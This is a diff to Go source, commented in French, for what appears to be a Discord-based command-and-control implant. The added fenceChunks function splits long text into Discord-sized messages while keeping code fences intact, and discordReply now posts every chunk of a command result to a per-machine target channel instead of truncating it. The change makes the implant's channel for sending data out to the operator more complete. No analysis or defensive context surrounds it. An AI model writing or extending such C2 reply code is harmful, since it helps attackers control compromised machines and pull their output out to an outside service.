@@ -121,14 +121,39 @@ func ioCopyDiscard(resp *http.Response) (int64, error) {
 	return io.Copy(io.Discard, resp.Body)
 }
 
+// fenceChunks découpe un texte trop long pour Discord en gardant les blocs de
+// code fermés. Couper au milieu d'un ``` laissait la fin du message en texte
+// brut, hors de la boîte — c'était le défaut de l'aide.
+func fenceChunks(text string, limit int) []string {
+	var out []string
+	for len(text) > limit {
+		cut := strings.LastIndex(text[:limit], "\n")
+		if cut < limit/2 {
+			cut = limit
+		}
+		chunk := text[:cut]
+		open := strings.Count(chunk, "```")%2 == 1
+		if open {
+			chunk += "\n```"
+		}
+		out = append(out, chunk)
+		text = text[cut:]
+		text = strings.TrimLeft(text, "\n")
+		if open {
+			text = "```\n" + text
+		}
+	}
+	if s := strings.TrimSpace(text); s != "" {
+		out = append(out, s)
+	}
+	return out
+}
+
 // discordReply envoie un message dans le canal de commande.
 func discordReply(text string) {
 	text = strings.TrimSpace(text)
 	if text == "" {
 		text = "OK"
-	}
-	if len(text) > 1900 {
-		text = text[:1900] + "\n… (tronqué)"
 	}
 	// Le salon change d'une machine à l'autre : on le résout à chaque envoi.
 	ch := targetChannel()
@@ -136,11 +161,14 @@ func discordReply(text string) {
 		plog("c2 reply: aucun salon cible")
 		return
 	}
-	if _, err := discordPost(fmt.Sprintf("/channels/%s/messages", ch),
-		map[string]string{"content": text}); err != nil {
-		plog("c2 reply: " + err.Error())
+	for _, chunk := range fenceChunks(text, 1900) {
+		if _, err := discordPost(fmt.Sprintf("/channels/%s/messages", ch),
+			map[string]string{"content": chunk}); err != nil {
+			plog("c2 reply: " + err.Error())
+			return
+		}
+		time.Sleep(700 * time.Millisecond) // limite de débit Discord
 	}
-	time.Sleep(700 * time.Millisecond) // limite de débit Discord
 }
 
 type discordMessage struct {
